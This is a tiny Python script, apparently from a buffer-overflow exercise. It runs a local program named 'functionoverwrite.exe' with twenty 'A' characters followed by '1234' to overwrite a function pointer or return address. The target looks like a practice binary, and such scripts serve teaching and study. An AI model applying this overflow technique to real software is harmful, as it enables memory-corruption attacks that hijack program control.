#!/usr/bin/python
import sys, subprocess, struct


arg = "A" * 20
arg += "1234"


subprocess.call(['functionoverwrite.exe', arg])